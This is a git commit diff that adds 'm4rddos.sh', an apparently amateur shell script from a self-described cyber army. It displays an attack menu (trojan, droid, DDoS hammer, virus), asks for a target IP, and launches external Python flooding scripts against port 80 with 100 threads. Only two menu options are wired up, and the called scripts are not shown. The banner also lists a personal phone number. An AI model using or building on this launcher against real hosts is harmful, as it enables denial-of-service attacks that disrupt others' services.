4417bebca23ed31d8d742a58ae2aa71336e90b53
m4rch3ll-cyber <52129378+m4rche3ll-cyber@users.noreply.github.com>
2019-06-28 13:09:40 +0700

    Add files via upload

---
+++ m4rddos.sh
@@ -0,0 +1,52 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS " | lolcat 
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :MR.M4RCH3LL/INDONRESIA CYBER ARMY"
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS MR.M4RCH3LL TROJAN "
+echo $red"---------------------------------------"
+echo $green"?facebook : Colonimus solit        " 
+echo $green"?WhatsApp: 0838-9235-7370           " 
+echo $green"?Message :gunakan dengan bijak      " 
+echo $red"---------------------------------------"
+echo $yellow"                 DDOS"|lolcat
+echo $red"---------------------------------------" 
+echo $white"[1].ATTACK TROJAN" |lolcat
+echo $white"[2].ATTACK DROID" |lolcat
+echo $white"[3].ATTACK DDOS" |lolcat
+echo $white"[4].DDOS HAMMER" |lolcat
+echo $white"[5].mr.m4r VIRUS" | lolcat
+echo $white"[0].keluar" |lolcat
+echo $red"---------------------------------------" 
+echo $red"MASUKAN PILIHAN ANDA cok " |lolcat
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " ATTACK TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " ATTACK DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
